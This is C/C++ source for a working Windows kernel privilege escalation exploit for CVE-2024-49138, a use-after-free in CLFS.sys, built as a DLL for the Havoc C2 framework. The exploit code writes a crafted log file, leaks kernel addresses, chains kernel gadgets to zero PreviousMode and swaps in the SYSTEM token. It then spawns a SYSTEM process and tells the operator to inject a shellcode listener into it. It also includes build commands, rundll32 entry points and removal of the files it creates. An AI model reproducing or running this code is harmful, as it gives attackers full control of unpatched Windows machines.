/*
 * CVE-2024-49138 LPE Exploit - DLL for Havoc DllSpawn
 *
 * Vuln:    CLFS.sys (Common Log File System) Use-After-Free
 *          Corrupted BLF metadata triggers UAF on container object,
 *          redirecting execution via fake vtable -> arbitrary write
 *          -> zeroes KTHREAD.PreviousMode -> DKOM token swap -> SYSTEM
 * Req:     Regular user (medium integrity), NO admin required
 * Targets: Windows 10/11, Server 2016-2022 (pre-Dec 2024 patch)
 * Patched: KB5048667 (December 10, 2024)
 *
 * Based on: github.com/MrAle98/CVE-2024-49138-POC
 *
 * Build: cl.exe /O2 /MT /LD exploit_dll.cpp /Fe:cve_2024_49138.dll /link Clfsw32.lib advapi32.lib psapi.lib
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "Clfsw32.lib")
#pragma comment(lib, "psapi.lib")

#ifdef __cplusplus
extern "C" {
#endif

#include "blf_data.h"

/* ================================================================
 * ntdll typedefs
 * ================================================================ */
typedef NTSTATUS (NTAPI *fn_NtReadVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_RtlGetVersion)(PRTL_OSVERSIONINFOW);

static fn_NtReadVirtualMemory     pNtReadVirtualMemory;
static fn_NtWriteVirtualMemory    pNtWriteVirtualMemory;
static fn_NtQuerySystemInformation pNtQuerySystemInformation;
static fn_RtlGetVersion           pRtlGetVersion;

/* ================================================================
 * Handle table
 * ================================================================ */
typedef struct {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYS_HANDLE_ENTRY;

typedef struct {
    ULONG            NumberOfHandles;
    SYS_HANDLE_ENTRY Handles[1];
} SYS_HANDLE_INFO;

/* ================================================================
 * Build-specific offsets
 * ================================================================ */
static ULONG g_build             = 0;
static ULONG g_tokenOff          = 0;
static ULONG g_activeLinksOff    = 0;
static ULONG g_uniquePidOff      = 0;
static ULONG g_prevModeOff       = 0x232;

static ULONG_PTR g_pofxOff       = 0;   /* PoFxProcessorNotification RVA */
static ULONG_PTR g_dbgkOff       = 0;   /* DbgkpTriageDumpRestoreState RVA */
static ULONG_PTR g_psActiveOff   = 0;   /* PsActiveProcessHead RVA */

static wchar_t g_target[MAX_PATH] = L"notepad.exe";

/* ================================================================
 * FixStdout
 * ================================================================ */
static void FixStdout(void) {
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    if (!h || h == INVALID_HANDLE_VALUE) return;
    int fd = _open_osfhandle((intptr_t)h, _O_TEXT);
    if (fd < 0) return;
    _dup2(fd, _fileno(stdout));
    setvbuf(stdout, NULL, _IONBF, 0);
}

/* ================================================================
 * Resolve ntdll + offsets
 * ================================================================ */
static BOOL NtLoad(void) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return FALSE;
    pNtReadVirtualMemory      = (fn_NtReadVirtualMemory)GetProcAddress(h, "NtReadVirtualMemory");
    pNtWriteVirtualMemory     = (fn_NtWriteVirtualMemory)GetProcAddress(h, "NtWriteVirtualMemory");
    pNtQuerySystemInformation = (fn_NtQuerySystemInformation)GetProcAddress(h, "NtQuerySystemInformation");
    pRtlGetVersion            = (fn_RtlGetVersion)GetProcAddress(h, "RtlGetVersion");
    return (pNtReadVirtualMemory && pNtWriteVirtualMemory &&
            pNtQuerySystemInformation && pRtlGetVersion);
}

static BOOL ResolveOffsets(void) {
    RTL_OSVERSIONINFOW vi = {0};
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (pRtlGetVersion(&vi) != 0) return FALSE;
    g_build = vi.dwBuildNumber;
    printf("[*] OS: Windows %lu.%lu Build %lu\n", vi.dwMajorVersion, vi.dwMinorVersion, g_build);

    g_prevModeOff = 0x232;

    if (g_build <= 17763) {
        g_tokenOff       = 0x358;
        g_uniquePidOff   = 0x2E0;
        g_activeLinksOff = 0x2E8;
    } else if (g_build <= 18363) {
        g_tokenOff       = 0x360;
        g_uniquePidOff   = 0x2E8;
        g_activeLinksOff = 0x2F0;
    } else {
        g_tokenOff       = 0x4B8;
        g_uniquePidOff   = 0x440;
        g_activeLinksOff = 0x448;
    }

    printf("[+] Offsets: Token=0x%X ActiveLinks=0x%X UniqueProcessId=0x%X PreviousMode=0x%X\n",
           g_tokenOff, g_activeLinksOff, g_uniquePidOff, g_prevModeOff);
    return TRUE;
}

/* ================================================================
 * Get kernel base via EnumDeviceDrivers
 * ================================================================ */
static ULONG_PTR GetKernelBase(void) {
    LPVOID drivers[1024];
    DWORD needed;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return 0;
    return (ULONG_PTR)drivers[0];
}

/* ================================================================
 * Resolve ntoskrnl exports dynamically
 * ================================================================ */
static BOOL ResolveKernelSymbols(ULONG_PTR kernelBase) {
    HMODULE hNtk = LoadLibraryExW(L"C:\\Windows\\System32\\ntoskrnl.exe",
                                   NULL, 1 /* DONT_RESOLVE_DLL_REFERENCES */);
    if (!hNtk) {
        printf("[-] LoadLibraryEx ntoskrnl: %u\n", GetLastError());
        return FALSE;
    }

    FARPROC pPofx = GetProcAddress(hNtk, "PoFxProcessorNotification");
    FARPROC pPsAc = GetProcAddress(hNtk, "PsActiveProcessHead");

    if (pPofx) g_pofxOff = (ULONG_PTR)pPofx - (ULONG_PTR)hNtk;
    if (pPsAc) g_psActiveOff = (ULONG_PTR)pPsAc - (ULONG_PTR)hNtk;

    /* Pattern scan for DbgkpTriageDumpRestoreState in PAGE section */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)hNtk;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS*)((BYTE*)hNtk + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    /*
     * DbgkpTriageDumpRestoreState signature (Windows 10/11 x64):
     * The function writes at offset 0x2078:
     *   48 89 88 78 20 00 00   mov [rax+2078h], rcx
     * Search for the 0x2078 displacement in mov instructions
     */
    BYTE pat1[] = { 0x48, 0x89, 0x88, 0x78, 0x20, 0x00, 0x00 };
    BYTE pat2[] = { 0x48, 0x89, 0x90, 0x78, 0x20, 0x00, 0x00 };
    BYTE pat3[] = { 0x48, 0x89, 0x80, 0x78, 0x20, 0x00, 0x00 };

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, "PAGE", 4) == 0 || memcmp(sec[i].Name, ".text", 5) == 0) {
            BYTE *base = (BYTE*)hNtk + sec[i].VirtualAddress;
            SIZE_T sz = sec[i].Misc.VirtualSize;

            for (SIZE_T j = 0; j + 7 <= sz; j++) {
                if (memcmp(base + j, pat1, 7) == 0 ||
                    memcmp(base + j, pat2, 7) == 0 ||
                    memcmp(base + j, pat3, 7) == 0) {
                    /* Walk backwards to find function prologue */
                    for (SIZE_T back = 1; back < 0x200 && j >= back; back++) {
                        BYTE *fp = base + j - back;
                        /* Common prologues: 48 89 5C 24 (mov [rsp+..],rbx) or
                         * 40 53 (push rbx) or 48 83 EC (sub rsp,..) or
                         * 48 8B C4 (mov rax,rsp) */
                        if ((fp[0] == 0x48 && fp[1] == 0x89 && fp[2] == 0x5C && fp[3] == 0x24) ||
                            (fp[0] == 0x48 && fp[1] == 0x8B && fp[2] == 0xC4) ||
                            (fp[0] == 0x40 && fp[1] == 0x53)) {
                            /* Verify: previous byte should be CC (int3) or C3 (ret) */
                            if (j - back > 0) {
                                BYTE prev = *(fp - 1);
                                if (prev == 0xCC || prev == 0xC3) {
                                    g_dbgkOff = (ULONG_PTR)fp - (ULONG_PTR)hNtk;
                                    goto found;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
found:

    FreeLibrary(hNtk);

    printf("[+] PoFxProcessorNotification RVA: 0x%llx %s\n",
           (ULONG64)g_pofxOff, g_pofxOff ? "" : "(NOT FOUND)");
    printf("[+] PsActiveProcessHead RVA: 0x%llx %s\n",
           (ULONG64)g_psActiveOff, g_psActiveOff ? "" : "(NOT FOUND)");
    printf("[+] DbgkpTriageDumpRestoreState RVA: 0x%llx %s\n",
           (ULONG64)g_dbgkOff, g_dbgkOff ? "(pattern scan)" : "(NOT FOUND)");

    if (!g_pofxOff || !g_psActiveOff || !g_dbgkOff) {
        printf("[-] Failed to resolve required kernel symbols\n");
        return FALSE;
    }
    return TRUE;
}

/* ================================================================
 * Handle -> kernel address
 * ================================================================ */
static PVOID GetKAddrFromHandle(HANDLE handle) {
    ULONG size = 0x100000;
    SYS_HANDLE_INFO *pInfo = (SYS_HANDLE_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    if (!pInfo) return NULL;

    NTSTATUS st;
    while ((st = pNtQuerySystemInformation(0x10, pInfo, size, &size)) == 0xC0000004L) {
        pInfo = (SYS_HANDLE_INFO*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pInfo, (SIZE_T)size * 2);
        if (!pInfo) return NULL;
        size *= 2;
    }

    PVOID result = NULL;
    DWORD pid = GetCurrentProcessId();
    for (ULONG i = 0; i < pInfo->NumberOfHandles; i++) {
        if (pInfo->Handles[i].UniqueProcessId == (USHORT)pid &&
            pInfo->Handles[i].HandleValue == (USHORT)(ULONG_PTR)handle) {
            result = pInfo->Handles[i].Object;
            break;
        }
    }
    HeapFree(GetProcessHeap(), 0, pInfo);
    return result;
}

/* ================================================================
 * SYSTEM check
 * ================================================================ */
static BOOL IsSystem(void) {
    HANDLE hT = NULL; BOOL r = FALSE; DWORD sz = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hT)) return FALSE;
    GetTokenInformation(hT, TokenUser, NULL, 0, &sz);
    TOKEN_USER *tu = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), 0, sz);
    if (tu && GetTokenInformation(hT, TokenUser, tu, sz, &sz)) {
        SID_IDENTIFIER_AUTHORITY a = SECURITY_NT_AUTHORITY;
        PSID s = NULL;
        if (AllocateAndInitializeSid(&a, 1, SECURITY_LOCAL_SYSTEM_RID, 0,0,0,0,0,0,0, &s)) {
            r = EqualSid(tu->User.Sid, s); FreeSid(s);
        }
    }
    if (tu) HeapFree(GetProcessHeap(), 0, tu);
    CloseHandle(hT);
    return r;
}

/* ================================================================
 * Core exploit
 * ================================================================ */
static BOOL DoExploit(void) {
    BOOL success = FALSE;
    HANDLE logHndl = INVALID_HANDLE_VALUE;
    PVOID fakeObj = NULL;
    HANDLE threadHandle = NULL;
    const wchar_t *blfPath = L"C:\\temp\\testlog\\mylogdddd.blf.blf";
    const wchar_t *containerPath = L"C:\\temp\\testlog\\container1";
    const wchar_t *logDir1 = L"C:\\temp";
    const wchar_t *logDir2 = L"C:\\temp\\testlog";
    ULONGLONG cbContainer = 0x80000;

    printf("[*] CVE-2024-49138 - CLFS Use-After-Free LPE\n");
    printf("[*] Target: %S\n\n", g_target);

    if (IsSystem()) { printf("[+] Already SYSTEM!\n"); goto spawn; }

    /* 1 - Resolve */
    if (!NtLoad())          { printf("[-] ntdll resolve failed\n"); return FALSE; }
    if (!ResolveOffsets())  { printf("[-] OS detect failed\n"); return FALSE; }

    /* 2 - Get kernel base */
    ULONG_PTR kernelBase = GetKernelBase();
    if (!kernelBase) { printf("[-] Kernel base not found\n"); return FALSE; }
    printf("[+] ntoskrnl base: 0x%llx\n", (ULONG64)kernelBase);

    /* 3 - Resolve kernel symbols dynamically */
    if (!ResolveKernelSymbols(kernelBase)) return FALSE;

    /* 4 - Create directories and initial BLF */
    CreateDirectoryW(logDir1, NULL);
    CreateDirectoryW(logDir2, NULL);

    const wchar_t *logFileName = L"LOG:C:\\temp\\testlog\\mylogdddd.blf";

    logHndl = CreateLogFile(logFileName,
                            GENERIC_WRITE | GENERIC_READ,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL, OPEN_ALWAYS, 0);
    if (logHndl == INVALID_HANDLE_VALUE) {
        printf("[-] CreateLogFile: %u\n", GetLastError());
        return FALSE;
    }
    printf("[+] Initial BLF created\n");

    if (!AddLogContainer(logHndl, &cbContainer, (LPWSTR)containerPath, NULL)) {
        DWORD err = GetLastError();
        if (err != 183 /* ERROR_ALREADY_EXISTS */) {
            printf("[-] AddLogContainer: %u\n", err);
            CloseHandle(logHndl);
            return FALSE;
        }
    }
    printf("[+] Container added\n");
    CloseHandle(logHndl);
    logHndl = INVALID_HANDLE_VALUE;

    /* 5 - Write crafted BLF (triggers UAF on open) */
    {
        HANDLE hf = CreateFileW(blfPath, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            printf("[-] CreateFile BLF: %u\n", GetLastError());
            return FALSE;
        }
        DWORD written;
        WriteFile(hf, g_blf_data, g_blf_size, &written, NULL);
        CloseHandle(hf);
        printf("[+] Crafted BLF written (%u bytes)\n", written);
    }

    /* 6 - Get KTHREAD address for PreviousMode */
    DWORD tid = GetCurrentThreadId();
    threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!threadHandle) {
        printf("[-] OpenThread: %u\n", GetLastError());
        return FALSE;
    }

    PVOID kthread = GetKAddrFromHandle(threadHandle);
    if (!kthread) {
        printf("[-] KTHREAD leak failed\n");
        CloseHandle(threadHandle);
        return FALSE;
    }

    LPVOID prevModeAddr = (LPVOID)((ULONG_PTR)kthread + g_prevModeOff);
    printf("[+] KTHREAD: 0x%p\n", kthread);
    printf("[+] PreviousMode addr: 0x%p\n", prevModeAddr);

    /* 7 - Allocate fake object at fixed address */
    fakeObj = VirtualAlloc((LPVOID)0x2100000, 0x1000,
                           MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!fakeObj) {
        printf("[-] VirtualAlloc at 0x2100000 failed, trying alt address\n");
        fakeObj = VirtualAlloc((LPVOID)0x3100000, 0x1000,
                               MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (!fakeObj) {
            printf("[-] VirtualAlloc failed: %u\n", GetLastError());
            CloseHandle(threadHandle);
            return FALSE;
        }
    }
    printf("[+] Fake object at: 0x%p\n", fakeObj);

    memset(fakeObj, 0, 0x1000);

    ULONG_PTR pofxAddr = kernelBase + g_pofxOff;
    ULONG_PTR dbgkAddr = kernelBase + g_dbgkOff;

    /* Setup fake vtable chain:
     * fakeObj -> vtable -> PoFxProcessorNotification
     * PoFxProcessorNotification calls [rcx+0x40]+0x68 -> DbgkpTriageDumpRestoreState
     * DbgkpTriageDumpRestoreState writes value at [arg1[0]] + 0x2078
     */
    ULONG_PTR base = (ULONG_PTR)fakeObj;
    ULONG_PTR vtable = base + 0x100;

    /* fakeObj[0] = &vtable */
    *(PULONG_PTR)(base) = vtable;

    /* vtable[1] = PoFxProcessorNotification */
    ((PULONG_PTR)vtable)[1] = pofxAddr;

    /* fakeObj+0x40 -> fakeObj+0x200 (sub-object for PoFxProcessorNotification) */
    *(PULONG_PTR)(base + 0x40) = base + 0x200;
    /* sub-object+0x68 = DbgkpTriageDumpRestoreState */
    *(PULONG_PTR)(base + 0x200 + 0x68) = dbgkAddr;

    /* fakeObj+0x48 -> arg1 of DbgkpTriageDumpRestoreState */
    *(PULONG_PTR)(base + 0x48) = base + 0x300;

    ULONG_PTR argDbgk = base + 0x300;

    /* arg1[0] = target - 0x2078 (so write hits PreviousMode) */
    *(PULONG_PTR)(argDbgk) = (ULONG_PTR)prevModeAddr - 0x2078;

    /* arg1[0x10] = value to write (zeroes PreviousMode byte) */
    *(PULONG_PTR)(argDbgk + 0x10) = 0x0014000000000f00ULL;

    printf("[+] Fake vtable chain ready\n");
    printf("[+] Gadgets: PoFx=0x%llx Dbgk=0x%llx\n", (ULONG64)pofxAddr, (ULONG64)dbgkAddr);

    /* 8 - Trigger vulnerability */
    printf("[*] Setting REALTIME priority...\n");
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    printf("[*] Triggering CLFS UAF...\n");
    logHndl = CreateLogFile(logFileName,
                            GENERIC_WRITE | GENERIC_READ,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL, OPEN_ALWAYS, 0);
    if (logHndl != INVALID_HANDLE_VALUE) {
        CloseHandle(logHndl);
        logHndl = INVALID_HANDLE_VALUE;
    }

    SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
    printf("[+] CLFS UAF triggered\n");

    /* 9 - Verify we have kernel R/W */
    {
        DWORD64 buf = 0;
        pNtReadVirtualMemory((HANDLE)-1, (PVOID)kernelBase, &buf, sizeof(buf), NULL);
        printf("[*] ntoskrnl header read: 0x%llx\n", buf);
        if ((buf & 0xFFFF) != 0x5A4D) {
            printf("[-] Kernel R/W not achieved (MZ check failed)\n");
            printf("[-] PreviousMode not zeroed - exploit may need retry\n");
            goto cleanup;
        }
        printf("[+] Kernel R/W confirmed (MZ header OK)\n");
    }

    /* 10 - Token swap via EPROCESS linked list */
    {
        DWORD64 eprocess = 0;
        DWORD64 systemToken = 0;
        DWORD64 pid = 0;

        ULONG_PTR psActiveHead = kernelBase + g_psActiveOff;
        printf("[+] PsActiveProcessHead: 0x%llx\n", (ULONG64)psActiveHead);

        /* Read head of process list -> first EPROCESS */
        pNtReadVirtualMemory((HANDLE)-1, (PVOID)psActiveHead,
                             &eprocess, sizeof(eprocess), NULL);
        eprocess -= g_activeLinksOff;

        /* First process is System (PID 4) - grab its token */
        pNtReadVirtualMemory((HANDLE)-1, (PVOID)(eprocess + g_tokenOff),
                             &systemToken, sizeof(systemToken), NULL);
        printf("[+] System EPROCESS: 0x%llx Token: 0x%llx\n", eprocess, systemToken);

        /* Walk list to find our process */
        DWORD myPid = GetCurrentProcessId();
        int maxIter = 2000;
        while (maxIter-- > 0) {
            pNtReadVirtualMemory((HANDLE)-1, (PVOID)(eprocess + g_activeLinksOff),
                                 &eprocess, sizeof(eprocess), NULL);
            eprocess -= g_activeLinksOff;

            pNtReadVirtualMemory((HANDLE)-1, (PVOID)(eprocess + g_uniquePidOff),
                                 &pid, sizeof(pid), NULL);
            if ((DWORD)pid == myPid) break;
        }

        if ((DWORD)pid != myPid) {
            printf("[-] Current process not found in EPROCESS list\n");
            goto restore;
        }

        printf("[+] Current EPROCESS: 0x%llx (PID %u)\n", eprocess, myPid);

        /* Overwrite our token with System token */
        printf("[*] DKOM: overwriting Token...\n");
        pNtWriteVirtualMemory((HANDLE)-1, (PVOID)(eprocess + g_tokenOff),
                              &systemToken, sizeof(systemToken), NULL);
        printf("[+] Token swapped!\n");
    }

restore:
    /* 11 - Restore PreviousMode */
    {
        BYTE mode = 1;
        pNtWriteVirtualMemory((HANDLE)-1, prevModeAddr, &mode, sizeof(mode), NULL);
        printf("[+] PreviousMode restored\n");
    }

    if (!IsSystem()) {
        printf("[-] Token swap verification FAILED\n");
        goto cleanup;
    }
    printf("[+] === WE ARE NT AUTHORITY\\SYSTEM ===\n\n");
    success = TRUE;

spawn:
    {
        STARTUPINFOW si; PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si)); ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
        wchar_t cmd[MAX_PATH];
        lstrcpynW(cmd, g_target, MAX_PATH);
        printf("[*] Spawning: %S\n", g_target);
        if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("[-] CreateProcessW: %u\n", GetLastError());
        } else {
            printf("\n[+] ==================================\n");
            printf("[+]  SYSTEM process created!\n");
            printf("[+]  Process: %S\n", g_target);
            printf("[+]  PID:     %u\n", pi.dwProcessId);
            printf("[+] ==================================\n\n");
            printf("[*] Next: shinject %u x64 <listener>\n", pi.dwProcessId);
            CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
            success = TRUE;
        }
    }

cleanup:
    if (fakeObj) VirtualFree(fakeObj, 0, MEM_RELEASE);
    if (threadHandle) CloseHandle(threadHandle);
    /* Cleanup files */
    DeleteFileW(blfPath);
    DeleteFileW(containerPath);
    RemoveDirectoryW(logDir2);
    RemoveDirectoryW(logDir1);
    return success;
}

/* ================================================================
 * Check mode
 * ================================================================ */
static void DoCheck(void) {
    printf("[*] CVE-2024-49138 - Pre-flight Check\n\n");
    if (!NtLoad()) { printf("[-] ntdll resolve failed\n"); return; }
    if (!ResolveOffsets()) { printf("[-] OS detect failed\n"); return; }

    SYSTEM_INFO si; GetNativeSystemInfo(&si);
    printf("[*] Arch: %s\n", si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86");
    printf(IsSystem() ? "[+] SYSTEM: YES\n" : "[*] SYSTEM: NO\n");

    ULONG_PTR kb = GetKernelBase();
    if (kb) {
        printf("[+] ntoskrnl base: 0x%llx\n", (ULONG64)kb);
        ResolveKernelSymbols(kb);
    } else {
        printf("[-] Kernel base not accessible\n");
    }

    printf("[+] BLF payload: %u bytes embedded\n", g_blf_size);
    printf("\n[*] Check complete\n");
}

/* ================================================================
 * Args
 * ================================================================ */
static void ParseArgs(const char *args) {
    if (!args || !args[0]) return;
    while (*args == ' ' || *args == '\t') args++;
    if (strncmp(args, "run", 3) == 0) {
        const char *p = args + 3;
        while (*p == ' ' || *p == '\t') p++;
        if (*p && *p != '\r' && *p != '\n') {
            MultiByteToWideChar(CP_ACP, 0, p, -1, g_target, MAX_PATH);
            int len = lstrlenW(g_target);
            while (len > 0 && (g_target[len-1] == L' ' || g_target[len-1] == L'\r' || g_target[len-1] == L'\n'))
                g_target[--len] = 0;
        }
    }
}

/* ================================================================
 * DllMain
 * ================================================================ */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        FixStdout();
        const char *args = NULL;
        if (lpvReserved && ((const char*)lpvReserved)[0] != '\0')
            args = (const char*)lpvReserved;
        printf("[cve-2024-49138] args: %s\n\n", args ? args : "(none)");
        if (args && strncmp(args, "check", 5) == 0) DoCheck();
        else { ParseArgs(args); DoExploit(); }
        printf("\n[cve-2024-49138] Done\n");
        fflush(stdout);
    }
    return TRUE;
}

/* ================================================================
 * rundll32 exports
 * ================================================================ */
__declspec(dllexport)
void CALLBACK StartW(HWND hw, HINSTANCE hi, LPWSTR cmd, int sh) {
    (void)hw;(void)hi;(void)sh;
    FixStdout();
    char b[512]={0};
    if(cmd&&cmd[0]) WideCharToMultiByte(CP_ACP,0,cmd,-1,b,511,NULL,NULL);
    if(b[0]&&strncmp(b,"check",5)==0) DoCheck();
    else { ParseArgs(b[0]?b:NULL); DoExploit(); }
    fflush(stdout);
}

__declspec(dllexport)
void CALLBACK Start(HWND hw, HINSTANCE hi, LPSTR cmd, int sh) {
    (void)hw;(void)hi;(void)sh;
    FixStdout();
    if(cmd&&cmd[0]&&strncmp(cmd,"check",5)==0) DoCheck();
    else { ParseArgs(cmd); DoExploit(); }
    fflush(stdout);
}

#ifdef __cplusplus
}
#endif
